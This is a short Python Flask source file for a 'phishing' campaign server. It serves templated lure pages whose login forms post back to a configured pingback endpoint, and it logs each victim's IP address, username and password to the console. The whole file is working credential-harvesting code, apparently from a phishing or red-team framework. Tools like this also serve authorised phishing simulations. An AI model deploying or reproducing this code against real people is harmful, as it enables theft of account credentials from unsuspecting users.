from base.webserver import *
from flask import Response

class Campaign(Base):
  def __init__(self):
    super().__init__('phishing')

  @route('/post', methods=['POST'])
  def handle_post(self):
    user_name = request.form.get('user')
    password = request.form.get('pass')
    print(f'{self.get_remote_addr()} Username: {user_name}; Password: {password}')
    print('')
    return 'OK\n'

  @route('/<filename>', methods=['GET'])
  def handle_get(self, filename):
    print(f'{self.get_remote_addr()} requesting: {filename}')
    if not self.env_has_file(filename):
      abort(404)
    template = self.get_template(filename)
    endpoint = urljoin(server.config['pingback'], 'post')
    html = template.render(postto=endpoint)
    src, full_path, _update = self.env.loader.get_source(self.env, filename)
    mime, encoding = mimetypes.guess_type(full_path)
    return Response(html, mimetype=mime)

Campaign.register(server, route_base='/')
